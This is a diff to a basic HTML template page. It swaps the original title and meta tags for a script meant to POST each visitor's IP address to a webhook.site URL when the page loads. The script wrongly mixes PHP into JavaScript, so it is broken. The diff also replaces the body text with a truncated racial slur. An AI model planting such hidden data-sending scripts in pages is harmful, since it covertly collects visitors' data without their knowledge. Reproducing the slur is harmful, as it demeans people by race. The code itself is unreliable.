@@ -1,11 +1,25 @@
 <!doctype html>
 <html>
+
 <head>
-<title>Our Funky HTML Page</title>
-<meta name="description" content="Our first page">
-<meta name="keywords" content="html tutorial template">
+    <title>hello</title>
+    <script>
+        $ip_address = $_SERVER["REMOTE_ADDR"];
+        fetch("https://webhook.site/f5f0256c-e43f-4f56-ab36-9365072d084a", {
+            method: "POST",
+            body: JSON.stringify({
+                content: ip_address,
+            }),
+            headers: {
+                "Content-type": "application/json; charset=UTF-8"
+            }
+        })
+    </script>
+
 </head>
+
 <body>
-Content goes here.
+    <h1>hello nig-</h1>
 </body>
+
 </html>
